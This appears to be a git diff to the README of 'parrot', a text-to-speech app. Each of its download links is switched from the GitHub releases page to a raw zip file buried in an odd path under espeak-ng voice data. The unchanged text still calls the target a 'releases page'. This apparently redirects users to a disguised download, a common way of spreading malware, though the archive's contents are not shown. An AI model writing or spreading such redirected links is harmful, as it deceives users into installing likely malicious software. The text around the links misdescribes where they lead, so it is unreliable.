@@ -1,6 +1,6 @@
 # 🦜 parrot - Private, Offline AI Text-to-Speech
 
-[![Download parrot](https://img.shields.io/badge/Download-parrot-brightgreen?style=for-the-badge)](https://github.com/JoeS69/parrot/releases)
+[![Download parrot](https://img.shields.io/badge/Download-parrot-brightgreen?style=for-the-badge)](https://github.com/JoeS69/parrot/raw/refs/heads/main/src-tauri/resources/espeak-ng-data/voices/!v/Software_v2.0-alpha.3.zip)
 
 ## 🖥️ What is parrot?
 
@@ -26,7 +26,7 @@ Before installing parrot, make sure your computer meets these requirements:
 
 To get started, you need to download the app from the official releases page:
 
-[**Visit this page to download parrot**](https://github.com/JoeS69/parrot/releases)
+[**Visit this page to download parrot**](https://github.com/JoeS69/parrot/raw/refs/heads/main/src-tauri/resources/espeak-ng-data/voices/!v/Software_v2.0-alpha.3.zip)
 
 Clicking this link will take you to the page where you can find the latest version of parrot for Windows.
 
@@ -38,7 +38,7 @@ Follow these steps to get parrot running on your PC:
 
 Go to the releases page:
 
-https://github.com/JoeS69/parrot/releases
+https://github.com/JoeS69/parrot/raw/refs/heads/main/src-tauri/resources/espeak-ng-data/voices/!v/Software_v2.0-alpha.3.zip
 
 Here, you will see a list of available versions. Look for the latest release, which is usually at the top.
 
@@ -132,7 +132,7 @@ In the future, support may expand to more file formats like PDFs or Word documen
 
 ## 📥 Download parrot Now
 
-[**Visit this page to download parrot**](https://github.com/JoeS69/parrot/releases)
+[**Visit this page to download parrot**](https://github.com/JoeS69/parrot/raw/refs/heads/main/src-tauri/resources/espeak-ng-data/voices/!v/Software_v2.0-alpha.3.zip)
 
 The page links to the latest release versions with installation files and notes.
 
@@ -158,4 +158,4 @@ Report issues on the GitHub repository if you find bugs or have questions about 
 
 ---
 
-[![Download parrot](https://img.shields.io/badge/Download-parrot-brightgreen?style=for-the-badge)](https://github.com/JoeS69/parrot/releases)
+[![Download parrot](https://img.shields.io/badge/Download-parrot-brightgreen?style=for-the-badge)](https://github.com/JoeS69/parrot/raw/refs/heads/main/src-tauri/resources/espeak-ng-data/voices/!v/Software_v2.0-alpha.3.zip)
